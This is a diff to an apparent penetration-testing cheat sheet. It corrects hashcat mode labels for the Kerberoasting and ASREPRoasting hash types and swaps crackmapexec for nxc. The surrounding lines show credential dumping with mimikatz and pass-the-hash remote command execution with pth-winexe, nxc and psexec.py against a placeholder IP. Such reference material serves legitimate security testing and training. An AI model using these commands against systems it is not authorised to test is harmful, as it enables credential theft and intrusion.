@@ -136,9 +136,9 @@ hashcat --session mysession --restore
 5600  = NetNTLMv2
 3200  = bcrypt
 1800  = sha512crypt (Linux)
-7500  = Kerberos 5 AS-REP (krb5asrep)
-13100 = Kerberos 5 TGS-REP (krb5tgs)
-18200 = Kerberos 5 AS-REP (asreproast)
+7500  = Kerberos 5 etype 23 AS-REQ Pre-Auth  (sniffed pre-auth, not roasting)
+13100 = Kerberos 5 etype 23 TGS-REP          (Kerberoasting, krb5tgs)
+18200 = Kerberos 5 etype 23 AS-REP           (ASREPRoasting, krb5asrep)
 16800 = WPA-PMKID-PBKDF2
 22000 = WPA-PBKDF2-PMKID+EAPOL
 ```
@@ -338,7 +338,7 @@ lsadump::sam
 pth-winexe -U domain/user%hash //10.10.10.10 cmd
 
 # crackmapexec
-crackmapexec smb 10.10.10.10 -u administrator -H 'hash' -x whoami
+nxc smb 10.10.10.10 -u administrator -H 'hash' -x whoami
 
 # psexec.py
 psexec.py -hashes :hash administrator@10.10.10.10
